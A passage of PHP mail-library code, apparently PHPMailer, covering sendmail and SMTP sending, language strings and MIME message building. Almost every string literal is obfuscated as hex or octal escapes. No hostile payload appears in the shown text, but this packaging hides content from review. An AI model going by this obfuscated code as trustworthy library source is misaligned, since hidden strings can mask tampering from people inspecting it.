if ($this->Mailer == "\x71\155\x61\x69\x6c") { $sendmailFmt = "\x25\163"; } else { $sendmailFmt = "\x25\163\x20\55\157\x69\40\x2d\x74"; } } $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $toAddr) { if (!@($mail = popen($sendmail, "\167"))) { throw new phpmailerException($this->lang("\145\170\x65\x63\x75\164\x65") . $this->Sendmail, self::STOP_CRITICAL); } fputs($mail, "\x54\x6f\72\40" . $toAddr . "\xa"); fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From); if ($result != 0) { throw new phpmailerException($this->lang("\x65\170\x65\x63\165\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } } else { if (!@($mail = popen($sendmail, "\167"))) { throw new phpmailerException($this->lang("\145\x78\x65\143\165\164\145") . $this->Sendmail, self::STOP_CRITICAL); } fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From); if ($result != 0) { throw new phpmailerException($this->lang("\x65\170\x65\143\165\x74\145") . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($string) { if (escapeshellcmd($string) !== $string or !in_array(escapeshellarg($string), array("\x27{$string}\x27", "\42{$string}\42"))) { return false; } $length = strlen($string); for ($i = 0; $i < $length; $i++) { $c = $string[$i]; if (!ctype_alnum($c) && strpos("\x40\x5f\x2d\x2e", $c) === false) { return false; } } return true; } protected static function isPermittedPath($path) { return !preg_match("\43\x5e\x5b\x61\x2d\172\x5d\53\x3a\57\x2f\43\x69", $path); } protected function mailSend($header, $body) { $toArr = array(); foreach ($this->to as $toaddr) { $toArr[] = $this->addrFormat($toaddr); } $to = implode("\x2c\x20", $toArr); $params = null; if (!empty($this->Sender) and $this->validateAddress($this->Sender)) { if (self::isShellSafe($this->Sender)) { $params = sprintf("\55\x66\x25\163", $this->Sender); } } if (!empty($this->Sender) and !ini_get("\x73\x61\x66\x65\x5f\x6d\157\144\145") and $this->validateAddress($this->Sender)) { $old_from = ini_get("\x73\145\x6e\x64\155\141\151\x6c\x5f\146\x72\x6f\x6d"); ini_set("\x73\145\156\144\155\x61\151\x6c\137\x66\162\157\x6d", $this->Sender); } $result = false; if ($this->SingleTo and count($toArr) > 1) { foreach ($toArr as $toAddr) { $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params); $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From); } } else { $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params); $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From); } if (isset($old_from)) { ini_set("\163\145\x6e\x64\155\x61\x69\154\137\146\x72\157\x6d", $old_from); } if (!$result) { throw new phpmailerException($this->lang("\151\x6e\163\x74\141\156\164\x69\x61\164\x65"), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } protected function smtpSend($header, $body) { $bad_rcpt = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new phpmailerException($this->lang("\163\155\164\x70\137\x63\157\156\x6e\x65\143\164\137\x66\x61\x69\x6c\145\144"), self::STOP_CRITICAL); } if (!empty($this->Sender) and $this->validateAddress($this->Sender)) { $smtp_from = $this->Sender; } else { $smtp_from = $this->From; } if (!$this->smtp->mail($smtp_from)) { $this->setError($this->lang("\146\x72\157\x6d\x5f\146\x61\x69\x6c\x65\x64") . $smtp_from . "\x20\x3a\x20" . implode("\x2c", $this->smtp->getError())); throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL); } foreach (array($this->to, $this->cc, $this->bcc) as $togroup) { foreach ($togroup as $to) { if (!$this->smtp->recipient($to[0])) { $error = $this->smtp->getError(); $bad_rcpt[] = array("\164\x6f" => $to[0], "\x65\x72\162\157\162" => $error["\x64\145\x74\141\x69\x6c"]); $isSent = false; } else { $isSent = true; } $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From); } } if (count($this->all_recipients) > count($bad_rcpt) and !$this->smtp->data($header . $body)) { throw new phpmailerException($this->lang("\144\x61\164\141\x5f\x6e\x6f\164\137\x61\143\x63\x65\x70\164\x65\144"), self::STOP_CRITICAL); } if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } if (count($bad_rcpt) > 0) { $errstr = ''; foreach ($bad_rcpt as $bad) { $errstr .= $bad["\164\x6f"] . "\72\40" . $bad["\145\x72\162\157\x72"]; } throw new phpmailerException($this->lang("\162\145\143\x69\x70\x69\x65\x6e\x74\x73\x5f\146\x61\151\154\145\144") . $errstr, self::STOP_CONTINUE); } return true; } public function smtpConnect($options = null) { if (is_null($this->smtp)) { $this->smtp = $this->getSMTPInstance(); } if (is_null($options)) { $options = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $hosts = explode("\73", $this->Host); $lastexception = null; foreach ($hosts as $hostentry) { $hostinfo = array(); if (!preg_match("\57\136\50\x28\163\163\154\x7c\164\x6c\x73\x29\72\134\57\x5c\x2f\x29\x2a\x28\133\x61\x2d\x7a\101\x2d\132\60\x2d\71\x5c\x2e\55\135\52\x7c\x5c\x5b\x5b\x61\55\x66\101\55\106\60\55\x39\x3a\135\x2b\x5c\x5d\x29\72\x3f\50\133\60\x2d\71\135\x2a\51\44\x2f", trim($hostentry), $hostinfo)) { $this->edebug("\x49\147\x6e\x6f\162\151\156\147\x20\151\x6e\166\141\x6c\151\144\40\150\x6f\163\x74\x3a\40" . $hostentry); continue; } $prefix = ''; $secure = $this->SMTPSecure; $tls = $this->SMTPSecure == "\164\154\x73"; if ("\x73\x73\x6c" == $hostinfo[2] or '' == $hostinfo[2] and "\x73\x73\154" == $this->SMTPSecure) { $prefix = "\163\163\154\x3a\57\57"; $tls = false; $secure = "\x73\163\154"; } elseif ($hostinfo[2] == "\x74\154\163") { $tls = true; $secure = "\x74\x6c\163"; } $sslext = defined("\x4f\x50\105\x4e\x53\123\114\137\101\114\x47\x4f\x5f\123\x48\101\x31"); if ("\164\x6c\x73" === $secure or "\163\163\154" === $secure) { if (!$sslext) { throw new phpmailerException($this->lang("\145\170\164\145\x6e\x73\151\157\156\x5f\155\x69\163\163\x69\156\x67") . "\157\160\145\x6e\x73\163\154", self::STOP_CRITICAL); } } $host = $hostinfo[3]; $port = $this->Port; $tport = (int) $hostinfo[4]; if ($tport > 0 and $tport < 65536) { $port = $tport; } if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) { try { if ($this->Helo) { $hello = $this->Helo; } else { $hello = $this->serverHostname(); } $this->smtp->hello($hello); if ($this->SMTPAutoTLS and $sslext and $secure != "\163\x73\x6c" and $this->smtp->getServerExt("\x53\x54\101\x52\124\124\114\123")) { $tls = true; } if ($tls) { if (!$this->smtp->startTLS()) { throw new phpmailerException($this->lang("\143\157\x6e\x6e\145\143\164\137\150\x6f\x73\164")); } $this->smtp->hello($hello); } if ($this->SMTPAuth) { if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->Realm, $this->Workstation)) { throw new phpmailerException($this->lang("\141\165\x74\x68\145\x6e\x74\151\x63\x61\164\145")); } } return true; } catch (phpmailerException $exc) { $lastexception = $exc; $this->edebug($exc->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions and !is_null($lastexception)) { throw $lastexception; } return false; } public function smtpClose() { if (is_a($this->smtp, "\123\115\124\x50")) { if ($this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } } public function setLanguage($langcode = "\x65\x6e", $lang_path = '') { $renamed_langcodes = array("\142\162" => "\x70\164\x5f\x62\162", "\x63\172" => "\143\x73", "\144\153" => "\x64\x61", "\156\157" => "\156\x62", "\x73\x65" => "\x73\166", "\163\x72" => "\162\163"); if (isset($renamed_langcodes[$langcode])) { $langcode = $renamed_langcodes[$langcode]; } $PHPMAILER_LANG = array("\x61\x75\x74\x68\145\x6e\x74\151\x63\141\164\x65" => "\x53\115\x54\x50\x20\105\162\x72\x6f\162\x3a\40\103\157\165\154\x64\x20\156\x6f\164\x20\x61\165\164\150\145\x6e\x74\x69\143\x61\164\145\x2e", "\x63\x6f\x6e\x6e\145\143\164\x5f\x68\157\163\x74" => "\x53\115\x54\x50\x20\105\162\162\157\162\x3a\40\x43\x6f\165\154\x64\40\x6e\157\x74\x20\143\157\x6e\156\x65\x63\164\x20\164\x6f\x20\x53\115\x54\x50\40\x68\x6f\163\164\56", "\144\141\164\141\x5f\156\157\x74\x5f\x61\x63\x63\145\x70\x74\x65\x64" => "\x53\115\x54\x50\40\x45\162\162\x6f\162\x3a\40\144\141\x74\141\40\156\x6f\164\40\x61\x63\143\x65\160\164\x65\x64\56", "\145\x6d\x70\164\171\x5f\x6d\x65\x73\163\x61\147\145" => "\x4d\x65\163\x73\141\x67\145\x20\142\157\144\171\40\145\x6d\x70\164\x79", "\145\x6e\143\x6f\x64\151\156\147" => "\125\156\153\x6e\157\167\x6e\40\x65\x6e\143\157\144\151\x6e\x67\x3a\40", "\145\170\145\143\x75\164\145" => "\x43\157\165\154\144\40\156\x6f\164\40\x65\x78\145\143\x75\x74\145\72\x20", "\146\151\x6c\145\x5f\141\x63\x63\145\163\163" => "\103\x6f\165\154\144\x20\x6e\157\x74\40\141\143\143\145\163\x73\40\x66\151\154\x65\72\x20", "\x66\x69\x6c\145\137\x6f\160\x65\x6e" => "\x46\151\x6c\x65\x20\105\x72\x72\157\x72\72\x20\103\x6f\165\x6c\x64\40\x6e\x6f\x74\40\157\x70\x65\x6e\x20\146\151\154\145\x3a\40", "\x66\162\157\x6d\x5f\x66\x61\151\x6c\x65\144" => "\124\x68\145\x20\x66\x6f\154\x6c\x6f\167\151\x6e\147\40\x46\x72\x6f\155\40\141\x64\144\162\145\x73\163\40\x66\141\151\154\145\x64\x3a\x20", "\x69\x6e\x73\164\141\x6e\164\x69\141\164\145" => "\103\x6f\165\154\x64\40\x6e\157\164\x20\151\156\163\164\141\x6e\164\x69\x61\x74\145\x20\x6d\141\151\154\x20\146\165\x6e\x63\x74\x69\x6f\156\x2e", "\151\x6e\x76\141\x6c\x69\144\x5f\141\144\144\x72\x65\x73\163" => "\111\156\166\x61\x6c\x69\x64\x20\141\x64\x64\x72\x65\x73\x73\x3a\40", "\x6d\x61\151\x6c\145\162\137\156\157\x74\x5f\x73\x75\x70\x70\x6f\162\x74\x65\144" => "\x20\155\141\x69\x6c\145\162\x20\151\163\40\156\x6f\x74\40\x73\x75\160\160\157\x72\x74\145\144\x2e", "\x70\x72\x6f\166\x69\144\x65\137\141\x64\144\162\145\x73\x73" => "\x59\157\x75\40\x6d\x75\163\x74\40\x70\162\157\166\x69\x64\x65\40\x61\x74\x20\x6c\x65\x61\163\164\x20\157\x6e\x65\x20\162\x65\x63\151\160\x69\145\x6e\164\40\145\x6d\141\x69\x6c\x20\141\144\x64\162\145\x73\163\x2e", "\162\x65\143\x69\160\151\145\156\x74\163\137\x66\141\151\154\145\144" => "\123\115\x54\120\40\x45\x72\162\x6f\162\x3a\x20\124\x68\145\40\146\157\154\x6c\x6f\167\x69\x6e\x67\x20\162\145\x63\x69\160\151\x65\156\164\x73\40\146\141\151\x6c\145\144\72\40", "\163\x69\147\156\x69\156\147" => "\123\x69\x67\x6e\151\x6e\x67\40\105\162\162\x6f\x72\72\x20", "\163\155\x74\x70\137\x63\157\x6e\156\x65\x63\164\137\x66\141\x69\x6c\145\x64" => "\123\115\124\120\x20\x63\x6f\156\x6e\x65\143\x74\50\51\x20\x66\141\151\154\145\144\56", "\163\155\164\160\137\145\162\162\x6f\x72" => "\123\115\124\x50\x20\x73\x65\x72\x76\145\162\x20\x65\162\162\x6f\162\72\x20", "\166\141\x72\151\141\142\154\x65\x5f\x73\x65\x74" => "\103\x61\x6e\156\157\164\x20\163\145\x74\40\157\x72\x20\162\145\163\145\164\40\166\141\162\x69\141\x62\x6c\x65\72\40", "\x65\x78\164\x65\x6e\x73\151\x6f\x6e\137\155\151\x73\163\x69\156\x67" => "\x45\x78\164\x65\156\163\x69\157\x6e\x20\x6d\151\163\x73\151\156\147\72\x20"); if (empty($lang_path)) { $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . "\x6c\141\156\147\165\x61\x67\145" . DIRECTORY_SEPARATOR; } if (!preg_match("\57\136\133\141\x2d\x7a\x5d\173\x32\175\x28\77\72\137\133\141\55\x7a\101\x2d\x5a\135\x7b\62\x7d\51\x3f\x24\57", $langcode)) { $langcode = "\145\156"; } $foundlang = true; $lang_file = $lang_path . "\x70\150\x70\x6d\141\x69\154\145\162\56\x6c\x61\156\x67\55" . $langcode . "\x2e\160\x68\x70"; if ($langcode != "\x65\x6e") { if (!self::isPermittedPath($lang_file) or !is_readable($lang_file)) { $foundlang = false; } else { $foundlang = (include $lang_file); } } $this->language = $PHPMAILER_LANG; return (bool) $foundlang; } public function getTranslations() { return $this->language; } public function addrAppend($type, $addr) { $addresses = array(); foreach ($addr as $address) { $addresses[] = $this->addrFormat($address); } return $type . "\x3a\40" . implode("\54\40", $addresses) . $this->LE; } public function addrFormat($addr) { if (empty($addr[1])) { return $this->secureHeader($addr[0]); } else { return $this->encodeHeader($this->secureHeader($addr[1]), "\160\x68\162\x61\163\x65") . "\40\74" . $this->secureHeader($addr[0]) . "\76"; } } public function wrapText($message, $length, $qp_mode = false) { if ($qp_mode) { $soft_break = sprintf("\x20\x3d\45\x73", $this->LE); } else { $soft_break = $this->LE; } $is_utf8 = strtolower($this->CharSet) == "\x75\164\x66\x2d\x38"; $lelen = strlen($this->LE); $crlflen = strlen(self::CRLF); $message = $this->fixEOL($message); if (substr($message, -$lelen) == $this->LE) { $message = substr($message, 0, -$lelen); } $lines = explode($this->LE, $message); $message = ''; foreach ($lines as $line) { $words = explode("\x20", $line); $buf = ''; $firstword = true; foreach ($words as $word) { if ($qp_mode and strlen($word) > $length) { $space_left = $length - strlen($buf) - $crlflen; if (!$firstword) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "\75") { $len--; } elseif (substr($word, $len - 2, 1) == "\x3d") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= "\40" . $part; $message .= $buf . sprintf("\x3d\45\x73", self::CRLF); } else { $message .= $buf . $soft_break; } $buf = ''; } while (strlen($word) > 0) { if ($length <= 0) { break; } $len = $length; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "\75") { $len--; } elseif (substr($word, $len - 2, 1) == "\x3d") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); if (strlen($word) > 0) { $message .= $part . sprintf("\75\x25\163", self::CRLF); } else { $buf = $part; } } } else { $buf_o = $buf; if (!$firstword) { $buf .= "\x20"; } $buf .= $word; if (strlen($buf) > $length and $buf_o != '') { $message .= $buf_o . $soft_break; $buf = $word; } } $firstword = false; } $message .= $buf . self::CRLF; } return $message; } public function utf8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "\x3d"); if (false !== $encodedCharPos) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { if ($encodedCharPos > 0) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); } $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case "\x61\x6c\164": case "\141\154\x74\137\x69\156\x6c\x69\156\145": case "\141\154\164\x5f\141\164\164\x61\143\150": case "\x61\154\164\x5f\151\156\154\x69\x6e\145\x5f\x61\164\x74\x61\x63\150": $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $result = ''; $result .= $this->headerLine("\104\x61\164\145", $this->MessageDate == '' ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ($this->Mailer != "\x6d\141\x69\154") { foreach ($this->to as $toaddr) { $this->SingleToArray[] = $this->addrFormat($toaddr); } } } else { if (count($this->to) > 0) { if ($this->Mailer != "\x6d\141\x69\x6c") { $result .= $this->addrAppend("\124\x6f", $this->to); } } elseif (count($this->cc) == 0) { $result .= $this->headerLine("\x54\x6f", "\165\x6e\144\x69\163\x63\x6c\x6f\163\x65\144\55\x72\145\143\x69\160\151\x65\156\x74\163\72\73"); } } $result .= $this->addrAppend("\106\x72\157\155", array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $result .= $this->addrAppend("\103\143", $this->cc); } if (($this->Mailer == "\x73\145\x6e\x64\x6d\141\151\x6c" or $this->Mailer == "\x71\x6d\x61\x69\154" or $this->Mailer == "\x6d\141\x69\154") and count($this->bcc) > 0) { $result .= $this->addrAppend("\102\143\143", $this->bcc); } if (count($this->ReplyTo) > 0) { $result .= $this->addrAppend("\122\145\x70\154\x79\55\x54\157", $this->ReplyTo); } if ($this->Mailer != "\155\x61\151\154") { $result .= $this->headerLine("\123\x75\142\x6a\145\x63\x74", $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' != $this->MessageID and preg_match("\57\x5e\74\56\52\x40\x2e\x2a\x3e\x24\57", $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf("\74\x25\163\x40\45\163\x3e", $this->uniqueid, $this->serverHostname()); } $result .= $this->headerLine("\x4d\145\163\163\141\x67\145\x2d\111\104", $this->lastMessageID); if (!is_null($this->Priority)) { $result .= $this->headerLine("\130\x2d\120\x72\x69\157\x72\151\x74\171", $this->Priority); } if ($this->XMailer == '') { $result .= $this->headerLine("\x58\55\x4d\141\x69\154\145\162", "\120\x48\x50\x4d\141\151\x6c\x65\162\x20" . $this->Version . "\x20\50\x68\164\x74\x70\163\72\x2f\x2f\x67\x69\x74\150\x75\142\x2e\x63\x6f\x6d\57\120\110\x50\x4d\x61\151\154\145\x72\57\x50\110\x50\115\x61\x69\x6c\145\162\51"); } else { $myXmailer = trim($this->XMailer); if ($myXmailer) { $result .= $this->headerLine("\130\x2d\115\x61\151\154\145\162", $myXmailer); } } if ($this->ConfirmReadingTo != '') { $result .= $this->headerLine("\104\151\163\x70\x6f\163\151\x74\151\157\x6e\x2d\x4e\x6f\x74\x69\146\x69\143\141\x74\151\x6f\x6e\x2d\124\157", "\x3c" . $this->ConfirmReadingTo . "\x3e"); } foreach ($this->CustomHeader as $header) { $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1]))); } if (!$this->sign_key_file) { $result .= $this->headerLine("\x4d\111\x4d\x45\55\x56\x65\162\x73\x69\x6f\156", "\61\x2e\x30"); $result .= $this->getMailMIME(); } return $result; } public function getMailMIME() { $result = ''; $ismultipart = true; switch ($this->message_type) { case "\x69\x6e\154\151\156\145": $result .= $this->headerLine("\103\x6f\x6e\x74\x65\x6e\x74\55\124\x79\160\145", "\155\165\154\164\151\x70\x61\162\164\57\x72\x65\154\x61\x74\x65\144\x3b"); $result .= $this->textLine("\11\x62\157\x75\x6e\144\x61\x72\171\x3d\x22" . $this->boundary[1] . "\x22"); break; case "\x61\x74\x74\141\x63\150": case "\151\x6e\154\x69\156\145\x5f\x61\164\164\x61\143\x68": case "\141\154\164\137\x61\x74\x74\x61\143\150": case "\x61\154\164\x5f\151\156\x6c\151\156\x65\x5f\141\164\x74\x61\x63\x68": $result .= $this->headerLine("\103\x6f\156\x74\145\x6e\164\x2d\124\171\x70\x65", "\155\x75\x6c\x74\x69\x70\141\162\x74\x2f\155\151\170\x65\144\73"); $result .= $this->textLine("\11\x62\x6f\165\x6e\x64\141\162\x79\75\42" . $this->boundary[1] . "\x22"); break; case "\x61\154\x74": case "\141\154\164\137\x69\156\x6c\151\x6e\x65": $result .= $this->headerLine("\103\157\156\x74\x65\156\164\x2d\124\171\x70\145", "\155\165\154\x74\151\160\x61\162\x74\x2f\141\x6c\x74\145\x72\156\x61\164\151\x76\145\73"); $result .= $this->textLine("\x9\142\x6f\x75\x6e\144\x61\x72\171\x3d\42" . $this->boundary[1] . "\x22"); break; default: $result .= $this->textLine("\103\157\156\164\x65\x6e\164\x2d\x54\171\160\145\x3a\x20" . $this->ContentType . "\73\40\x63\150\141\x72\163\x65\164\x3d" . $this->CharSet); $ismultipart = false; break; } if ($this->Encoding != "\67\x62\151\x74") { if ($ismultipart) { if ($this->Encoding == "\70\x62\151\x74") { $result .= $this->headerLine("\x43\x6f\156\164\145\156\x74\x2d\x54\x72\x61\156\163\x66\x65\162\x2d\x45\x6e\x63\x6f\144\x69\x6e\x67", "\x38\142\151\164"); } } else { $result .= $this->headerLine("\x43\157\156\x74\x65\x6e\x74\x2d\x54\162\141\156\163\x66\x65\x72\55\105\156\x63\x6f\x64\x69\156\x67", $this->Encoding); } } if ($this->Mailer != "\155\141\x69\x6c") { $result .= $this->LE; } return $result; } public function getSentMIMEMessage() { return rtrim($this->MIMEHeader . $this->mailHeader, "\xa\xd") . self::CRLF . self::CRLF . $this->MIMEBody; } protected function generateId() { return md5(uniqid(time())); } public function createBody() { $body = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = "\x62\61\137" . $this->uniqueid; $this->boundary[2] = "\142\62\x5f" . $this->uniqueid; $this->boundary[3] = "\142\x33\137" . $this->uniqueid; if ($this->sign_key_file) { $body .= $this->getMailMIME() . $this->LE; } $this->setWordWrap(); $bodyEncoding = $this->Encoding; $bodyCharSet = $this->CharSet; if ($bodyEncoding == "\x38\x62\x69\164" and !$this->has8bitChars($this->Body)) { $bodyEncoding = "\67\x62\151\164"; $bodyCharSet = "\x75\x73\55\141\163\x63\x69\x69"; } if ("\142\x61\163\145\66\x34" != $this->Encoding and self::hasLineLongerThanMax($this->Body)) { $bodyEncoding = "\161\165\157\x74\145\144\55\x70\162\151\156\x74\x61\x62\154\145"; } $altBodyEncoding = $this->Encoding; $altBodyCharSet = $this->CharSet; if ($altBodyEncoding == "\x38\x62\151\164" and !$this->has8bitChars($this->AltBody)) { $altBodyEncoding = "\67\x62\x69\164"; $altBodyCharSet = "\165\x73\x2d\141\x73\143\151\x69"; } if ("\x62\141\163\145\x36\x34" != $altBodyEncoding and self::hasLineLongerThanMax($this->AltBody)) { $altBodyEncoding = "\161\165\157\164\145\x64\x2d\160\x72\151\156\x74\x61\142\x6c\x65"; } $mimepre = "\x54\150\x69\x73\40\x69\x73\x20\141\40\x6d\x75\154\x74\x69\x2d\x70\x61\x72\x74\x20\x6d\145\163\163\141\147\145\40\x69\x6e\x20\115\111\115\x45\40\146\x6f\162\155\141\x74\56" . $this->LE . $this->LE; switch ($this->message_type) { case "\x69\x6e\154\x69\x6e\145": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x69\x6e\154\151\x6e\145", $this->boundary[1]); break; case "\x61\x74\164\141\143\x68": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x61\164\164\141\143\x68\155\145\156\164", $this->boundary[1]); break; case "\x69\x6e\154\x69\156\145\137\x61\164\x74\141\x63\x68": $body .= $mimepre; $body .= $this->textLine("\55\55" . $this->boundary[1]); $body .= $this->headerLine("\103\x6f\x6e\164\145\x6e\x74\x2d\x54\x79\160\x65", "\155\x75\x6c\x74\x69\x70\141\x72\x74\57\x72\x65\x6c\141\164\x65\144\x3b"); $body .= $this->textLine("\11\x62\157\165\156\144\x61\x72\171\75\x22" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\x69\x6e\x6c\151\156\x65", $this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\141\164\164\x61\143\x68\x6d\x65\156\164", $this->boundary[1]); break; case "\x61\154\x74": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, "\x74\x65\170\164\57\x70\x6c\x61\151\156", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, "\164\x65\170\164\57\150\x74\155\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; if (!empty($this->Ical)) { $body .= $this->getBoundary($this->boundary[1], '', "\x74\145\x78\164\x2f\x63\141\154\x65\156\x64\x61\162\73\40\x6d\x65\x74\x68\157\144\75\x52\105\121\x55\105\123\x54", ''); $body .= $this->encodeString($this->Ical, $this->Encoding); $body .= $this->LE . $this->LE; } $body .= $this->endBoundary($this->boundary[1]); break; case "\141\x6c\164\x5f\x69\x6e\154\151\156\145": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, "\x74\x65\170\x74\57\160\154\141\x69\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->textLine("\55\x2d" . $this->boundary[1]); $body .= $this->headerLine("\103\157\156\164\x65\x6e\x74\55\x54\x79\x70\x65", "\x6d\165\154\164\151\160\x61\162\164\x2f\x72\x65\154\141\x74\145\x64\x3b"); $body .= $this->textLine("\11\x62\x6f\165\156\x64\141\x72\171\x3d\42" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, "\x74\x65\170\164\57\150\x74\155\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\151\156\x6c\x69\x6e\x65", $this->boundary[2]); $body .= $this->LE; $body .= $this->endBoundary($this->boundary[1]); break; case "\x61\154\x74\137\x61\164\x74\141\x63\x68": $body .= $mimepre; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\156\164\145\156\164\55\x54\x79\x70\145", "\155\x75\x6c\x74\x69\160\x61\x72\x74\x2f\x61\x6c\x74\x65\x72\156\141\x74\x69\166\145\73"); $body .= $this->textLine("\x9\x62\157\165\x6e\x64\141\x72\171\75\x22" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, "\x74\145\x78\164\57\x70\x6c\x61\151\156", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, "\x74\145\x78\164\57\150\164\155\154", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->endBoundary($this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\141\164\x74\141\x63\x68\155\x65\156\164", $this->boundary[1]); break; case "\141\154\x74\x5f\151\x6e\x6c\x69\156\x65\x5f\x61\164\x74\141\143\x68": $body .= $mimepre; $body .= $this->textLine("\x2d\55" . $this->boundary[1]); $body .= $this->headerLine("\x43\157\x6e\164\x65\x6e\x74\55\x54\171\x70\145", "\155\x75\154\164\151\160\x61\x72\164\57\x61\x6c\x74\x65\162\x6e\141\164\x69\x76\145\73"); $body .= $this->textLine("\11\142\157\x75\x6e\x64\x61\162\x79\75\42" . $this->boundary[2] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, "\164\145\170\x74\x2f\160\x6c\141\151\x6e", $altBodyEncoding); $body .= $this->encodeString($this->AltBody, $altBodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->textLine("\x2d\x2d" . $this->boundary[2]); $body .= $this->headerLine("\x43\x6f\156\x74\x65\x6e\x74\55\x54\171\x70\x65", "\155\165\154\164\151\160\141\x72\x74\57\162\145\x6c\141\x74\x65\x64\73"); $body .= $this->textLine("\x9\142\157\x75\x6e\144\x61\162\171\75\42" . $this->boundary[3] . "\42"); $body .= $this->LE; $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, "\164\x65\x78\x74\x2f\150\164\x6d\x6c", $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\151\156\x6c\x69\x6e\145", $this->boundary[3]); $body .= $this->LE; $body .= $this->endBoundary($this->boundary[2]); $body .= $this->LE; $body .= $this->attachAll("\x61\164\164\x61\143\150\x6d\145\x6e\164", $this->boundary[1]); break; default: $this->Encoding = $bodyEncoding; $body .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $body = ''; } elseif ($this->sign_key_file) { try { if (!defined("\120\x4b\103\x53\x37\137\x54\105\130\124")) { throw new 